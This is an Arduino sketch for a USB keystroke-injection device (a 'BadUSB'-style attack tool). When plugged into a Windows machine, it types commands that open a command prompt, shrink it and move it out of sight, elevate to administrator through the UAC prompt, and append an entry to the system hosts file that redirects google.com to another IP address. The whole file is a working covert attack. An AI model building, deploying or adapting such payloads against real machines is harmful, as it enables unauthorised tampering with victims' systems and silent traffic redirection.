#include "Keyboard.h"

int LED1 = 7;
int LED2 = 8;

void setup() {
  pinMode(LED1, OUTPUT);
  pinMode(LED2, OUTPUT);
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() {

//LAUNCHES NON-ADMIN CMD PAYLOAD
//===================================//
    delay(5000);
    Keyboard.press(0x83);
    delay(100);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    
    Keyboard.print("cmd /Q /D /T:7F /F:OFF /V:ON /K");
    delay(100);
    Keyboard.press(0xB0);
    delay(100);
    Keyboard.releaseAll();
    delay(200);

//RESIZE CMD WINDOW TO VERY SMALL
    Keyboard.press(0x82);
    delay(100);
    Keyboard.press(' ');
    delay(100);
    Keyboard.press('s');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    
    Keyboard.press(0xD7);
    delay(100);
    Keyboard.releaseAll();
    delay(200);

    for (int x = 0; x < 100; x++){
      Keyboard.press(0xD8);
      delay(10);
      Keyboard.releaseAll();
      delay(20);
    }
    Keyboard.press(0xDA);
    delay(100);
    Keyboard.releaseAll();
    delay(200);

    for (int y = 0; y < 100; y++){
      Keyboard.press(0xD9);
      delay(10);
      Keyboard.releaseAll();
      delay(20);
    }
    Keyboard.write(0xB0);
    delay(500);

//MOVES WINDOW TO THE BOTTOM LEFT
    Keyboard.press(0x82);
    delay(100);
    Keyboard.press(' ');
    delay(100);
    Keyboard.press('m');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    for (int i = 0; i < 100; i++){
      Keyboard.press(0xD9);
      delay(10);
      Keyboard.releaseAll();
      delay(20);
      Keyboard.press(0xD8);
      delay(10);
      Keyboard.releaseAll();
      delay(20);
    }
    Keyboard.write(0xB0);
    delay(500);
    
//NON-ADMIN PAYLOAD BEGINS HERE
    Keyboard.print("color 0a");
    delay(100);
    Keyboard.write(0xB0);
    delay(100);
    Keyboard.print("ECHO Check google.com");
    delay(100);
    Keyboard.write(0xB0);
    delay(100);

//LAUNCH CMD AS ADMIN (WORX ON W7)
//===================================//
    delay(500);
    Keyboard.press(0x83);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.print("cmd");
    delay(2000);
    
    Keyboard.press(0x80);
    delay(100);
    Keyboard.press(0x81);
    delay(100);
    Keyboard.press(0xB0);
    delay(50);
    Keyboard.releaseAll();
    delay(3000);
    Keyboard.press(0xD8);
    delay(100);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(0xB0);
    delay(100);
    Keyboard.releaseAll();
    delay(500);
//ADMIN PAYLOAD BEGINS HERE
    Keyboard.print("cmd /Q /D /T:7F /F:OFF /V:ON /K");
    delay(100);
    Keyboard.write(0xB0);
    delay(100);
    //MAKE WINDOW HIDDEN AGAIN
    Keyboard.press(0x82);
    delay(100);
    Keyboard.press(' ');
    delay(100);
    Keyboard.press('s');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);
    
    Keyboard.press(0xD7);
    delay(100);
    Keyboard.releaseAll();
    delay(200);

    for (int x = 0; x < 100; x++){
      Keyboard.press(0xD8);
      delay(10);
      Keyboard.releaseAll();
      delay(20);
    }
    Keyboard.press(0xDA);
    delay(100);
    Keyboard.releaseAll();
    delay(200);

    for (int y = 0; y < 100; y++){
      Keyboard.press(0xD9);
      delay(10);
      Keyboard.releaseAll();
      delay(20);
    }
    Keyboard.write(0xB0);
    delay(500);

    Keyboard.press(0x82);
    delay(100);
    Keyboard.press(' ');
    delay(100);
    Keyboard.press('m');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    for (int i = 0; i < 100; i++){
      Keyboard.press(0xD9);
      delay(10);
      Keyboard.releaseAll();
      delay(20);
      Keyboard.press(0xD8);
      delay(10);
      Keyboard.releaseAll();
      delay(20);
    }
    Keyboard.write(0xB0);
    delay(500);
    
    //ACTUAL PAYLOAD
    Keyboard.print("ECHO 204.79.197.200 google.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
    delay(100);
    Keyboard.write(0xB0);
    delay(100);
    Keyboard.print("exit");
    delay(100);
    Keyboard.write(0xB0);
    delay(100);
    
//LED CONFIG FOR EXECUTION CONFIRMATION
//===================================//
   for (int w = 0; w < 15; w++){
    digitalWrite(LED1, HIGH);
    digitalWrite(LED2, LOW);
    delay(300);
    digitalWrite(LED1, LOW);
    digitalWrite(LED2, HIGH);
    delay(300);
   }
    digitalWrite(LED1, LOW);
    digitalWrite(LED2, LOW);

//LOOP PREVENTION WITH LONG DELAY
    delay(5000000);
}
